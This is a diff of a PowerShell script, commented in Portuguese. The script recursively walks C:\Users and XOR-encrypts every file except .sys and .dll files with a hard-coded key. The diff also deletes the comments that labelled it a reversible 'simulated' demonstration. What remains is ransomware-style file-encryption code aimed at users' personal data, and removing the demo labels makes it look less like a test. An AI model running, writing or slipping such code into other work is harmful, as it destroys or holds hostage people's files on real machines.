@@ -1,6 +1,4 @@
-# Modo simulado: criptografia XOR reversível para demonstração
 $Key = [System.Text.Encoding]::UTF8.GetBytes("mO2MeuEd")
-# Atenção: Defina a raiz do C: para máxima simulação.
 $TargetRoot = "C:\Users"   # Para simular toda a máquina, pode ser "C:\", mas EVITE em produção real/testes em ambiente crítico.
 
 function Encrypt-FileXOR {
@@ -16,7 +14,6 @@ function Encrypt-FileXOR {
     }
 }
 
-# Percorre e criptografa arquivos (exceto arquivos críticos do SO)
 Get-ChildItem -Path $TargetRoot -Recurse -File -ErrorAction SilentlyContinue |
     Where-Object { ($_.Extension -ne ".sys") -and ($_.Extension -ne ".dll") } |
     ForEach-Object {
